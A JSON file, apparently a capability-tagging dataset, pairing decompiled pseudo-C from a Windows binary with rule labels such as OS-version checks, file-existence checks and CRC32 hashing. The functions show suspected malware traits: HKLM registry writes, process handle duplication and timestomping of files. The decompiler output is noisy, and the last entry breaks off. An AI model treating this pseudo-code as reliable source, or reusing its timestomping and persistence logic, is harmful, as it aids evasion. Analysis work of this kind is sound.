{
    "00401000": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401000(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    // [00] -r-x section size 16384 named .text\n    uStack12 = 4;\n    iVar1 = fcn.00401960(0x80000002, 0x41f600, 0x41f64c, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 150
    },
    "00401620": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040174d) overlaps instruction at (ram,0x0040174c)\n// \n\nuint __cdecl fcn.00401620(code *arg_8h, char *arg_ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    code cVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint *unaff_ESI;\n    uint *puVar9;\n    int32_t *piVar10;\n    code *pcVar11;\n    code *pcVar12;\n    bool bVar13;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    code *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    var_264h = 0;\n    puVar9 = &var_263h;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    var_160h = '\\0';\n    piVar10 = &var_15fh;\n    for (iVar6 = 0x40; pcVar5 = NULL,  var_4h = NULL,  iVar6 != 0; iVar6 = iVar6 + -1) {\n        *piVar10 = 0;\n        piVar10 = piVar10 + 1;\n    }\n    while( true ) {\n        puVar4 = piVar10 + 2;\n        *piVar10 = pcVar5;\n        piVar10 = piVar10 + 3;\n        *puVar4 = pcVar5;\n        bVar13 = arg_ch != var_4h;\n        var_ch = 1;\n        var_8h = 1;\n        pcVar8 = var_4h;\n        if (bVar13) {\n            pcVar8 = 0x1;\n        }\n        if ((arg_ch < var_4h) || (arg_ch >= var_4h)) goto code_r0x00401691;\n        iVar6 = iVar6 + -1;\n        if (iVar6 == 0 || bVar13) break;\n        *arg_ch = *arg_ch + arg_ch;\n        pcVar5 = arg_ch;\n        var_4h = pcVar8;\n    }\n    uVar1 = *unaff_ESI;\n    *piVar10 = unaff_ESI + 1;\n    arg_8h = 0x8bb8ec44;\n    if (bVar13) {\n        cVar2 = uVar1 >> 0x18;\n        pcVar5 = (*0x9750e2b5 & 0xffff0000 | CONCAT11(cVar2 >> 0xf, *0x9750e2b5)) - 1;\n        *pcVar5 = *pcVar5 + (cVar2 >> 7);\n    }\ncode_r0x00401691:\n    pcVar11 = _sym.imp.MSVCRT.dll_sprintf;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x41f488, arg_8h);\n    (*pcVar11)(&var_264h, 0x41f4a0, arg_8h);\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar7 = 0xffffffff;\n    pcVar5 = &var_160h;\n    do {\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    var_48h = ~uVar7 - 1;\n    uVar7 = 0xffffffff;\n    pcVar11 = arg_8h;\n    do {\n        pcVar12 = pcVar11;\n        if (uVar7 == 0) break;\n        uVar7 = uVar7 - 1;\n        pcVar12 = pcVar11 + 1;\n        cVar3 = *pcVar11;\n        pcVar11 = pcVar12;\n    } while (cVar3 != 0x0);\n    bVar13 = (POPCOUNT(~uVar7 - 1 & 0xff) & 1U) == 0;\n    var_34h = 0x41f4c8;\n    var_30h = 0x41f4d4;\n    var_2ch = 0x41f4e0;\n    var_28h = 0x41f4f0;\n    var_24h = 0x41f4f8;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar7 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((bVar13) || (!bVar13)) {\n        pcVar12 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n        if (0x4 < pcVar8) {\n            return 1;\n        }\n    }\n    else {\n        *(pcVar8 + 0x3b7305fb) = *(pcVar8 + 0x3b7305fb) + -0x75;\n    }\n    uVar7 = pcVar8 * 4;\n    do {\n        iVar6 = (*pcVar12)(0x80000002, &var_264h, *(&var_34h + uVar7), *(&var_5ch + uVar7), *(&var_20h + uVar7), \n                           *(&var_48h + uVar7));\n        if (iVar6 != 0) {\n            return 0;\n        }\n        uVar7 = uVar7 + 4;\n    } while (uVar7 < 0x14);\n    return 1;\n}\n",
        "token_count": 1595
    },
    "00404410": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00404410(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00401050": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401156) overlaps instruction at (ram,0x00401155)\n// \n// WARNING: Removing unreachable block (ram,0x00401153)\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl\nfcn.00401050(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint *arg_20h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_EDX;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint *unaff_retaddr;\n    uchar var_10ch;\n    uint var_10bh;\n    uint uStack44;\n    uint *var_8h;\n    uchar *var_4h;\n    \n    puVar5 = arg_20h;\n    if ((0x10b < &stack0xfffffffc) && (puVar5 = arg_20h,  0x10b >= &stack0xfffffffc)) {\n        puVar1 = unaff_ESI + 0x43d1773a;\n        *puVar1 = *puVar1 ^ 0x8b27e95e;\n        puVar5 = unaff_ESI;\n        if (*puVar1 != 0) goto code_r0x00401098;\n    }\n    unaff_ESI = puVar5;\n    fcn.00403710(arg_18h, arg_1ch, arg_8h, 0x20, unaff_ESI + 8);\n    unaff_EBX = arg_18h;\n    unaff_EDI = arg_1ch;\ncode_r0x00401098:\n    uStack44 = 0x4010a9;\n    fcn.00403710(unaff_EBX, unaff_EDI, arg_ch, 0x20, unaff_ESI + 0x18);\n    var_4h = 0x20;\n    var_8h = arg_10h;\n    fcn.00403710(unaff_EBX, unaff_EDI, arg_10h, 0x20, unaff_ESI + 0x28);\n    var_4h = 0x20;\n    var_8h = arg_14h;\n    fcn.00403710(unaff_EBX, unaff_EDI, arg_14h, 0x20, unaff_ESI + 0x38);\n    var_8h = unaff_EDI;\n    var_4h = extraout_EDX;\n    iVar2 = fcn.00401000();\n    if (iVar2 == -1) {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(unaff_ESI + 0x48) = iVar2 % 5;\n    }\n    else {\n        *(unaff_ESI + 0x48) = iVar2;\n    }\n    var_10ch = 0;\n    puVar5 = &fcn.00401050::var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_4h = &stack0xfffffef0;\n    // WARNING: Bad instruction - Truncating control flow here\n    var_8h = &fcn.00401050::var_8h;\n    iVar2 = fcn.00401960();\n    puVar4 = arg_8h;\n    puVar6 = unaff_retaddr;\n    if (iVar2 != 0) {\n        var_4h = &stack0xfffffef0;\n        var_8h = 0x40119e;\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar7 = iVar2 == 0;\n        puVar6 = unaff_retaddr;\n        if ((bVar7) && ((bVar7 || (puVar4 = unaff_ESI,  puVar6 = puVar5 + 3,  !bVar7)))) {\n            *(unaff_ESI + 0x48) = *(unaff_ESI + 0x48) | 0x80;\n            puVar4 = arg_8h;\n            puVar6 = unaff_retaddr;\n        }\n    }\n    *puVar6 = *puVar4;\n    uVar3 = in(0x5d);\n    return uVar3;\n}\n",
        "token_count": 1096
    },
    "004014a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004014a0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint var_210h;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    puVar4 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    iVar2 = fcn.00401960(0x80000002, 0x41f87c, 0x41f8bc, &var_8h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)();\n    if (iVar2 == -1) {\n        return false;\n    }\n    uVar3 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar2 = fcn.00401350(uVar3 - 0x210, uVar3 - 0x10c);\n    pcVar1 = _sym.imp.MSVCRT.dll_strstr;\n    if (iVar2 == 0) {\n        return false;\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll_strstr)();\n    if (iVar2 != 0) {\n        return true;\n    }\n    iVar2 = (*pcVar1)();\n    return iVar2 != 0;\n}\n",
        "token_count": 387
    },
    "004017b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004017f8)\n// WARNING: Removing unreachable block (ram,0x00401800)\n\nuint __cdecl fcn.004017b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x41f94c)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = (**0x41f950)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x00401875:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x00401875;\n        }\n        iVar2 = (**0x41f954)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 376
    },
    "00402c90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    iVar1 = fcn.004017b0(0x41f478);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    bVar4 = iVar1 == 0;\n    if (!bVar4) {\n        if ((!bVar4) && (bVar4)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 262
    },
    "00402d20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d20(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    \n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0x40000000, 1, 0, 2, 0x80, 0);\n    if (arg_8h_00 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h_00, arg_ch, arg_10h, &arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (*0x41f948 != 0) {\n        iVar1 = fcn.00402c90(arg_8h_00);\n        *0x41f948 = iVar1 == 0;\n    }\n    fcn.00403850(0, arg_8h_00);\n    if (*0x41f948 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(arg_8h_00);\n    }\n    return 1;\n}\n",
        "token_count": 277
    },
    "00403850": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403850(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    bool bVar12;\n    uchar *puStack588;\n    uchar *puStack584;\n    uint uStack580;\n    uchar lpBuffer;\n    uint var_22fh;\n    uint var_12ch;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t hFile;\n    \n    puVar7 = &stack0xfffffffc;\n    lpBuffer = 0;\n    var_12ch._0_1_ = 0;\n    puVar11 = &fcn.00403850::var_22fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    bVar12 = true;\n    puVar11 = &fcn.00403850::var_12ch + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    puStack584 = &stack0xfffffdcc;\n    uStack580 = 0x104;\n    hFile = arg_ch;\n    puStack588 = 0x4038a6;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar12) && (puVar6 = &stack0xfffffffc,  bVar12)) {\n        puVar11 = &stack0xfffffdb4;\n        puVar6 = &stack0xfffffdb4;\n        puStack588 = &stack0xfffffffc;\n        cVar2 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar7;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    uVar4 = 0xffffffff;\n    pcVar9 = puVar6 + -0x230;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar2 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar2 != '\\0');\n    uVar4 = ~uVar4;\n    puVar7 = pcVar8 + -uVar4;\n    puVar11 = puVar6 + -300;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar4 = uVar4 & 3;\n    bVar12 = uVar4 != 0;\n    for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    if (bVar12) {\n        puStack588 = puStack588 & 0xffff | puVar7 << 0x10;\n    }\n    uVar4 = 0xffffffff;\n    pcVar9 = 0x41f444;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar2 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar2 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar9 = puVar6 + -300;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar2 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar2 != '\\0');\n    puVar7 = pcVar8 + -uVar4;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    puStack588 = puVar6 + -0x28;\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(puVar6 + -300, 0);\n    if (arg_ch == -1) {\n        iVar3 = fcn.004015e0(*(puVar6 + 8));\n        *(puVar6 + -4) = iVar3;\n        if (iVar3 == -1) {\n            return 0;\n        }\n    }\n    uVar1 = *(puVar6 + -4);\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(uVar1, puVar6 + -0x24, puVar6 + -0x1c, puVar6 + -0x14);\n    if (*(puVar6 + 0xc) == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n    }\n    return 1;\n}\n",
        "token_count": 1498
    },
    "00403a70": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ab6) overlaps instruction at (ram,0x00403ab5)\n// \n// WARNING: Removing unreachable block (ram,0x00403a95)\n\nuint fcn.00403a70(uint param_1)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar2;\n    char in_SF;\n    char in_OF;\n    \n    puVar2 = unaff_EDI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        puVar2 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(param_1, 0);\n    if (iVar1 != -1) {\n        if ((SBORROW4(iVar1, -1)) || (!SBORROW4(iVar1, -1))) {\n            return 0;\n        }\n        *puVar2 = *unaff_ESI;\n    }\n    return 1;\n}\n",
        "token_count": 261
    },
    "00403cc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00403cc0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004015e0(0x41f40c);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00401240": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401260) overlaps instruction at (ram,0x0040125b)\n// \n\nbool __fastcall fcn.00401240(uint8_t param_1)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    uStack8 = 0;\n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        in_EAX = &uStack8;\n    }\n    else {\n        *(in_EAX + -0x72c625aa) = *(in_EAX + -0x72c625aa) ^ param_1;\n        puVar4 = &stack0xfffffffd;\n    }\n    iVar2 = fcn.00403ad0(in_EAX);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (*(puVar4 + -4) == 0) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar5 = *(puVar4 + -4);\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x41f600, 0x41f640, 1, *(puVar4 + -4), ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 417
    },
    "00402550": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004025c8) overlaps instruction at (ram,0x004025c6)\n// \n// WARNING: Removing unreachable block (ram,0x004025b4)\n\nvoid __fastcall fcn.00402550(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint16_t extraout_CX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    int32_t extraout_ECX_05;\n    ushort extraout_DX;\n    uint extraout_EDX;\n    uint16_t unaff_BX;\n    uint32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    int32_t *piVar6;\n    bool bVar7;\n    uchar uVar8;\n    char cVar9;\n    char cVar10;\n    ulong uVar11;\n    uint uVar12;\n    uint uVar13;\n    int32_t *piVar14;\n    \n    cVar9 = param_2 >> 8;\n    cVar10 = SCARRY1(param_2, cVar9);\n    cVar9 = param_2 + cVar9 < '\\0';\n    fcn.00401890(0x4103f8, 0x11, 0x41f40c, 0x11);\n    iVar4 = fcn.00401890(0x4103f8, 0x11, 0x41f66c, 0x10);\n    piVar6 = unaff_EDI;\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        out(0xc4, iVar4);\n        piVar6 = unaff_EDI + 1;\n        *unaff_EDI = iVar4;\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f67c, 0x1a);\n    uVar13 = extraout_ECX;\n    uVar12 = extraout_EDX;\n    while( true ) {\n        bVar7 = uVar13 < uVar12;\n        uVar11 = fcn.00401890(0x4103f8, 0x11, 0x41f6d0, 10);\n        uVar12 = uVar11 >> 0x20;\n        if ((bVar7) || (!bVar7)) break;\n        iVar4 = uVar11 + 1;\n        if (&stack0xffffffdc < *uVar11 || iVar4 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(unaff_ESI + 0x50) = *(unaff_ESI + 0x50) ^ iVar4 >> 8;\n        uVar13 = extraout_ECX_00;\n    }\n    fcn.00401890(0x4103f8, 0x11, 0x41f6dc, 0xb);\n    uVar8 = 0;\n    cVar9 = (extraout_CX | 0x31fd) == 0;\n    piVar14 = piVar6;\n    iVar4 = unaff_ESI;\n    uVar5 = unaff_EBP;\n    while( true ) {\n        uVar13 = 0x402654;\n        fcn.00401890(0x4103f8, 0x11, 0x41f6e8, 0x4103f8);\n        if ((uVar8) || (!uVar8)) break;\n        if (extraout_ECX_01 == 1 || cVar9 == '\\0') {\n            *piVar6 = unaff_ESI + 4;\n            iVar1 = *0x9750e2b5;\n            unaff_ESI = 0x6ab8ec44;\n            *(*0x9750e2b5 + -0x10) = *(*0x9750e2b5 + -0x10) | unaff_EBP;\n            *(iVar1 + -8) = *(iVar1 + -8) + unaff_EBP;\ncode_r0x0040267b:\n            fcn.00401890(piVar14, iVar4, uVar5, uVar13);\n            iVar2 = fcn.00401890(0x4103f8, 0x11, 0x41f6fc, 9);\n            bVar7 = (POPCOUNT(iVar2 + 1U & 0xff) & 1U) == 0;\n            iVar4 = fcn.00401890(0x4103f8, 0x11, 0x41f708, 9);\n            if ((bVar7) || (piVar14 = piVar6,  !bVar7)) {\n                piVar14 = 0xc;\n                unaff_EBP = 0x41f714;\n                unaff_ESI = 0x11;\n            }\n            uVar13 = *0x6a17b43a;\n            *(iVar4 + 0x11) = *(iVar4 + 0x11) + (extraout_ECX_02 + 1 >> 8);\n            fcn.00401890(0x4103f8, unaff_ESI, unaff_EBP, piVar14);\n            bVar7 = false;\n            fcn.00401890(0x4103f8, 0x11, 0x41f83c, 3);\n            if ((bVar7) || (iVar4 = extraout_ECX_03,  !bVar7)) {\n                iVar4 = 10;\n                unaff_EBP = 0x41f840;\n                unaff_ESI = 0x11;\n            }\n            *piVar6 = *0x34a96cf4;\n            *0x40680a7b = *0x40680a7b + (extraout_ECX_03 + 1 >> 8);\n            fcn.00401890(0x4103f8, unaff_ESI, unaff_EBP, iVar4);\n            uVar12 = 0x34a96cf8;\n            fcn.00401890(0x4103f8, 0x11, 0x41f84c, 0x1b);\n            fcn.00401890(0x4103f8, 0x11, 0x41f868, 0x12);\n            uVar3 = fcn.00401890(0x4103f8, 0x11, 0x41f87c, 0x40);\n            uVar5 = ((uVar3 & 0xff00 | uVar3 & unaff_BX >> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n            bVar7 = SCARRY4(uVar5, uVar5);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8bc, 0xc);\n            if ((bVar7) || (iVar4 = extraout_ECX_04,  !bVar7)) {\n                iVar4 = 0xb;\n                uVar13 = 0x41f8c8;\n                uVar12 = 0x11;\n            }\n            piVar6[1] = *0x34a96cf8;\n            *0xc8680b7b = *0xc8680b7b + (extraout_ECX_04 + 1 >> 8);\n            fcn.00401890(0x4103f8, uVar12, uVar13, iVar4);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8d4, 4);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8d8, 4);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8dc, 0xc);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8e8, 4);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8ec, 9);\n            bVar7 = SCARRY1(extraout_DX, extraout_DX >> 8);\n            fcn.00401890(0x4103f8, 0x11, 0x41f8f8, 0x16);\n            if ((bVar7) || (iVar4 = extraout_ECX_05,  !bVar7)) {\n                iVar4 = 7;\n                uVar13 = 0x41f910;\n                uVar12 = 0x11;\n            }\n            piVar6[2] = *0x34a96cfc;\n            *0x1068077b = *0x1068077b + (extraout_ECX_05 + 1 >> 8);\n            fcn.00401890(0x4103f8, uVar12, uVar13, iVar4);\n            return;\n        }\n    }\n    uVar13 = 9;\n    uVar5 = 0x41f6f0;\n    iVar4 = 0x11;\n    piVar14 = 0x4103f8;\n    goto code_r0x0040267b;\n}\n",
        "token_count": 2196
    },
    "00403c10": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c10(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 132
    },
    "00401350": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
